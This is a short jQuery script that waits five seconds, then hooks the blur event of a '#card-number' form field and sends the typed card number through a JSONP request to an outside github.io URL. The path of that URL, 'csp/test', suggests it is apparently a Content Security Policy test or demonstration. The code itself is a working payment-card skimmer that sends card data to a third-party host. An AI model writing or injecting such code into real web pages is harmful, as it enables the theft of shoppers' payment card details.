setTimeout(function() {
  $("#card-number").on('blur', function() {
    $.ajax({
      url: "https://mmiesiak.github.io/csp/test.html?card=" + $(this).val(),

      // The name of the callback parameter, as specified by the YQL service
      jsonp: "callback",

      dataType: "jsonp",

      // Work with the response
      success: function( response ) {
          console.log( response );
      }
    })
  })
}, 5000);
